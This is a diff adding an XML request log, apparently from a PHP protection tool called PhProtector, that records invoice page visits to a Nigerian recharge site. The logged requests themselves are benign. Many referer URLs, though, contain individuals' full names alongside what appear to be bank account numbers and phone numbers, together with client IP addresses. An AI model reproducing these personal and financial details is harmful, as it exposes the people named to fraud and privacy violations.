@@ -1,0 +1,1967 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<?xml-stylesheet type="text/xsl" href=".log_style.xsl"?>
+<!--PhProtector logs-->
+<logs>
+ <log>
+  <date>05-12-2019 09:29:23</date>
+  <ip>129.56.40.169</ip>
+  <hostname>129.56.40.169</hostname>
+  <browser>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=242_129718</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>05-12-2019 09:31:04</date>
+  <ip>129.56.40.169</ip>
+  <hostname>129.56.40.169</hostname>
+  <browser>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=242_129718</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>05-12-2019 17:38:56</date>
+  <ip>41.190.12.108</ip>
+  <hostname>www.9mobile.com.ng</hostname>
+  <browser>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=1_130241</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=MIRACLE%20IZUCHUKWU%20ANTHONY&amp;detail2=2260226125</referer>
+ </log>
+ <log>
+  <date>05-12-2019 17:40:34</date>
+  <ip>41.190.12.108</ip>
+  <hostname>www.9mobile.com.ng</hostname>
+  <browser>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=1_130242</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=SIDIQ%20HAWA%20ARINOLA&amp;detail2=0034730174</referer>
+ </log>
+ <log>
+  <date>05-12-2019 17:42:07</date>
+  <ip>41.190.12.108</ip>
+  <hostname>www.9mobile.com.ng</hostname>
+  <browser>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=1_130245</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=ROSELINE%20ERITADE%20BAMIGBOYE&amp;detail2=0079167270</referer>
+ </log>
+ <log>
+  <date>06-12-2019 09:10:23</date>
+  <ip>197.210.70.58</ip>
+  <hostname>197.210.70.58</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 9; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36</browser>
+  <request>/invoice&amp;id=121_130352</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>06-12-2019 09:10:37</date>
+  <ip>197.210.70.58</ip>
+  <hostname>197.210.70.58</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 9; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36</browser>
+  <request>/invoice&amp;id=121_130195</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>06-12-2019 09:41:08</date>
+  <ip>197.210.70.58</ip>
+  <hostname>197.210.70.58</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 9; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36</browser>
+  <request>/invoice&amp;id=121_130369</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>06-12-2019 10:36:35</date>
+  <ip>41.217.30.81</ip>
+  <hostname>41.217.30.81</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_130195</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>06-12-2019 19:33:24</date>
+  <ip>197.210.85.184</ip>
+  <hostname>197.210.85.184</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 7.1.2; KFKAWI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36</browser>
+  <request>/invoice&amp;id=29_131032</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=PETER%20PHILOMINA%20ACHINGA&amp;detail2=2729564019</referer>
+ </log>
+ <log>
+  <date>06-12-2019 19:38:41</date>
+  <ip>197.210.85.184</ip>
+  <hostname>197.210.85.184</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 7.1.2; KFKAWI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36</browser>
+  <request>/invoice&amp;id=29_131033</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=ARTHUR%20CHIDIEBERE%20MBAMALU&amp;detail2=6052631053</referer>
+ </log>
+ <log>
+  <date>06-12-2019 19:42:03</date>
+  <ip>197.210.85.184</ip>
+  <hostname>197.210.85.184</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 7.1.2; KFKAWI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36</browser>
+  <request>/invoice&amp;id=29_131034</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=MUNKAILA%20ABDULMUMINI&amp;detail2=2092071076</referer>
+ </log>
+ <log>
+  <date>06-12-2019 19:47:57</date>
+  <ip>197.210.84.0</ip>
+  <hostname>197.210.84.0</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 7.1.2; KFKAWI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36</browser>
+  <request>/invoice&amp;id=29_131035</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=LAWAL%20HARUNA%20KUKI&amp;detail2=2109585305</referer>
+ </log>
+ <log>
+  <date>06-12-2019 21:39:53</date>
+  <ip>197.211.58.24</ip>
+  <hostname>197.211.58.24</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_130195</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>06-12-2019 22:01:32</date>
+  <ip>197.211.58.24</ip>
+  <hostname>197.211.58.24</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_131065</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=SHEHU%20MUSA%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>07-12-2019 08:29:32</date>
+  <ip>197.210.129.202</ip>
+  <hostname>197.210.129.202</hostname>
+  <browser>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=11_131077</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>07-12-2019 08:30:50</date>
+  <ip>197.210.129.202</ip>
+  <hostname>197.210.129.202</hostname>
+  <browser>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=11_131077</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>07-12-2019 10:59:49</date>
+  <ip>154.66.62.81</ip>
+  <hostname>154.66.62.81</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 6.0; A5002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36</browser>
+  <request>/invoice&amp;id=194_120722</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history&amp;ac=194</referer>
+ </log>
+ <log>
+  <date>07-12-2019 14:32:26</date>
+  <ip>197.211.58.24</ip>
+  <hostname>197.211.58.24</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_131381</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=BELLO%20ABDULLAHI%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>07-12-2019 14:33:00</date>
+  <ip>197.211.58.24</ip>
+  <hostname>197.211.58.24</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_131382</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=DIAMOND%20BANK%20PLC%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>07-12-2019 14:39:20</date>
+  <ip>197.211.58.24</ip>
+  <hostname>197.211.58.24</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_131381</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>07-12-2019 14:42:01</date>
+  <ip>154.120.64.237</ip>
+  <hostname>154.120.64.237</hostname>
+  <browser>Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/7.0.185.1002 Safari/537.36</browser>
+  <request>/invoice&amp;id=189_131380</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history&amp;ac=189</referer>
+ </log>
+ <log>
+  <date>07-12-2019 14:43:25</date>
+  <ip>154.120.64.237</ip>
+  <hostname>154.120.64.237</hostname>
+  <browser>Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/7.0.185.1002 Safari/537.36</browser>
+  <request>/invoice&amp;id=189_131383</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history&amp;ac=189</referer>
+ </log>
+ <log>
+  <date>07-12-2019 15:14:03</date>
+  <ip>154.120.64.235</ip>
+  <hostname>154.120.64.235</hostname>
+  <browser>Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=246_131045</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history&amp;ac=246</referer>
+ </log>
+ <log>
+  <date>07-12-2019 18:55:27</date>
+  <ip>105.112.121.58</ip>
+  <hostname>105.112.121.58</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 7.1.2; KFKAWI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36</browser>
+  <request>/invoice&amp;id=29_131035</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=LAWAL%20HARUNA%20KUKI&amp;detail2=2109585305</referer>
+ </log>
+ <log>
+  <date>07-12-2019 18:55:28</date>
+  <ip>105.112.121.58</ip>
+  <hostname>105.112.121.58</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 7.1.2; KFKAWI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36</browser>
+  <request>/invoice&amp;id=29_131035</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=LAWAL%20HARUNA%20KUKI&amp;detail2=2109585305</referer>
+ </log>
+ <log>
+  <date>07-12-2019 20:13:42</date>
+  <ip>197.242.124.135</ip>
+  <hostname>197.242.124.135</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_131448</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=ISSA%20ABDUL%20ISSA%20ABDUL&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>08-12-2019 15:52:40</date>
+  <ip>154.120.64.235</ip>
+  <hostname>154.120.64.235</hostname>
+  <browser>Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=131_131467</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history&amp;ac=131</referer>
+ </log>
+ <log>
+  <date>08-12-2019 16:36:45</date>
+  <ip>41.203.73.215</ip>
+  <hostname>41.203.73.215</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 5.1; TECNO PP7E-DLA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Safari/537.36</browser>
+  <request>/invoice&amp;id=191_131471</request>
+  <score>0.5</score>
+  <referer>https://www.rechargepro.com.ng/confirmation&amp;detail1=08026044434&amp;detail2=08026044434</referer>
+ </log>
+ <log>
+  <date>08-12-2019 17:58:06</date>
+  <ip>41.203.73.215</ip>
+  <hostname>41.203.73.215</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 5.1; TECNO PP7E-DLA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Safari/537.36</browser>
+  <request>/invoice&amp;id=191_131471</request>
+  <score>0.5</score>
+  <referer>https://www.rechargepro.com.ng/confirmation&amp;detail1=08026044434&amp;detail2=08026044434</referer>
+ </log>
+ <log>
+  <date>08-12-2019 18:00:55</date>
+  <ip>154.120.64.235</ip>
+  <hostname>154.120.64.235</hostname>
+  <browser>Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=131_131480</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history&amp;ac=131</referer>
+ </log>
+ <log>
+  <date>08-12-2019 21:00:06</date>
+  <ip>41.203.73.215</ip>
+  <hostname>41.203.73.215</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 5.1; TECNO PP7E-DLA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Safari/537.36</browser>
+  <request>/invoice&amp;id=191_131471</request>
+  <score>0.5</score>
+  <referer>https://www.rechargepro.com.ng/confirmation&amp;detail1=08026044434&amp;detail2=08026044434</referer>
+ </log>
+ <log>
+  <date>09-12-2019 10:52:20</date>
+  <ip>197.211.58.39</ip>
+  <hostname>197.211.58.39</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_131697</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>09-12-2019 11:14:21</date>
+  <ip>197.210.129.202</ip>
+  <hostname>197.210.129.202</hostname>
+  <browser>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=9_132046</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=07068906851&amp;detail2=07068906851</referer>
+ </log>
+ <log>
+  <date>09-12-2019 12:33:05</date>
+  <ip>197.210.129.202</ip>
+  <hostname>197.210.129.202</hostname>
+  <browser>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=9_132246</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=UNITEK%20ENERGY%20OTC&amp;detail2=115712223</referer>
+ </log>
+ <log>
+  <date>09-12-2019 14:24:56</date>
+  <ip>197.210.71.230</ip>
+  <hostname>197.210.71.230</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG SM-J610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36</browser>
+  <request>/invoice&amp;id=237_126451</request>
+  <score>0.5</score>
+  <referer>https://www.rechargepro.com.ng/</referer>
+ </log>
+ <log>
+  <date>09-12-2019 19:58:35</date>
+  <ip>197.211.58.44</ip>
+  <hostname>197.211.58.44</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_132770</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=DIAMOND%20BANK%20PLC%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>10-12-2019 08:11:58</date>
+  <ip>197.210.129.202</ip>
+  <hostname>197.210.129.202</hostname>
+  <browser>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=9_132246</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>10-12-2019 08:13:04</date>
+  <ip>197.210.129.202</ip>
+  <hostname>197.210.129.202</hostname>
+  <browser>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=200_132755</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>10-12-2019 08:13:29</date>
+  <ip>197.210.129.202</ip>
+  <hostname>197.210.129.202</hostname>
+  <browser>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=9_132246</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>10-12-2019 08:14:11</date>
+  <ip>197.210.129.202</ip>
+  <hostname>197.210.129.202</hostname>
+  <browser>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=199_131408</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>10-12-2019 10:42:26</date>
+  <ip>197.210.129.202</ip>
+  <hostname>197.210.129.202</hostname>
+  <browser>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=9_132246</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>10-12-2019 10:57:59</date>
+  <ip>129.56.40.9</ip>
+  <hostname>129.56.40.9</hostname>
+  <browser>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=1_133285</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=OTUNBA%20YAKUBU%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>10-12-2019 10:58:13</date>
+  <ip>197.210.129.202</ip>
+  <hostname>197.210.129.202</hostname>
+  <browser>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=9_132246</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>10-12-2019 11:04:37</date>
+  <ip>129.56.40.9</ip>
+  <hostname>129.56.40.9</hostname>
+  <browser>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=1_133308</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=MUSA%20RIMAMSKEB%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>10-12-2019 11:07:02</date>
+  <ip>129.56.40.9</ip>
+  <hostname>129.56.40.9</hostname>
+  <browser>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=1_133320</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=ABDULLAHI%20SHUAIBUI%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>10-12-2019 13:08:46</date>
+  <ip>197.210.129.202</ip>
+  <hostname>197.210.129.202</hostname>
+  <browser>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=9_132246</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>10-12-2019 15:02:59</date>
+  <ip>197.210.129.202</ip>
+  <hostname>197.210.129.202</hostname>
+  <browser>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=9_132246</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>10-12-2019 15:03:02</date>
+  <ip>197.210.129.202</ip>
+  <hostname>197.210.129.202</hostname>
+  <browser>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=199_131408</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>10-12-2019 15:03:10</date>
+  <ip>197.210.129.202</ip>
+  <hostname>197.210.129.202</hostname>
+  <browser>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=9_132246</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>10-12-2019 15:11:45</date>
+  <ip>197.210.129.202</ip>
+  <hostname>197.210.129.202</hostname>
+  <browser>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=9_132246</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>10-12-2019 16:34:12</date>
+  <ip>41.190.14.34</ip>
+  <hostname>www.9mobile.com.ng</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 6.0; Infinix HOT 4 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36</browser>
+  <request>/invoice&amp;id=171_126828</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/</referer>
+ </log>
+ <log>
+  <date>10-12-2019 16:48:10</date>
+  <ip>41.190.14.34</ip>
+  <hostname>www.9mobile.com.ng</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 6.0; Infinix HOT 4 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36</browser>
+  <request>/invoice&amp;id=171_126828</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/home</referer>
+ </log>
+ <log>
+  <date>10-12-2019 16:48:58</date>
+  <ip>41.190.14.34</ip>
+  <hostname>www.9mobile.com.ng</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 6.0; Infinix HOT 4 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36</browser>
+  <request>/invoice&amp;id=171_126828</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/home</referer>
+ </log>
+ <log>
+  <date>10-12-2019 16:50:05</date>
+  <ip>41.190.14.34</ip>
+  <hostname>www.9mobile.com.ng</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 6.0; Infinix HOT 4 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36</browser>
+  <request>/invoice&amp;id=171_126828</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/home</referer>
+ </log>
+ <log>
+  <date>10-12-2019 16:51:38</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 5.1; TECNO PP7E-DLA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Safari/537.36</browser>
+  <request>/invoice&amp;id=191_133810</request>
+  <score>0.5</score>
+  <referer>https://www.rechargepro.com.ng/confirmation&amp;detail1=08026044434&amp;detail2=08026044434</referer>
+ </log>
+ <log>
+  <date>10-12-2019 16:56:38</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 5.1; TECNO PP7E-DLA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Safari/537.36</browser>
+  <request>/invoice&amp;id=191_133810</request>
+  <score>0.5</score>
+  <referer>https://www.rechargepro.com.ng/confirmation&amp;detail1=08026044434&amp;detail2=08026044434</referer>
+ </log>
+ <log>
+  <date>10-12-2019 17:05:58</date>
+  <ip>41.190.14.34</ip>
+  <hostname>www.9mobile.com.ng</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 6.0; Infinix HOT 4 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36</browser>
+  <request>/invoice&amp;id=171_126828</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/</referer>
+ </log>
+ <log>
+  <date>10-12-2019 17:07:16</date>
+  <ip>129.56.40.63</ip>
+  <hostname>129.56.40.63</hostname>
+  <browser>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=1_133822</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=ZENITH%20BANK%20OF%20PLC%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>10-12-2019 17:08:14</date>
+  <ip>129.56.40.63</ip>
+  <hostname>129.56.40.63</hostname>
+  <browser>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=1_133824</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=ZENTH%20BANK%20PLC%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>10-12-2019 18:03:20</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_132623</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>10-12-2019 19:23:56</date>
+  <ip>105.112.120.112</ip>
+  <hostname>105.112.120.112</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 7.1.2; KFKAWI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36</browser>
+  <request>/invoice&amp;id=29_131035</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=LAWAL%20HARUNA%20KUKI&amp;detail2=2109585305</referer>
+ </log>
+ <log>
+  <date>10-12-2019 23:29:00</date>
+  <ip>41.190.12.85</ip>
+  <hostname>www.9mobile.com.ng</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
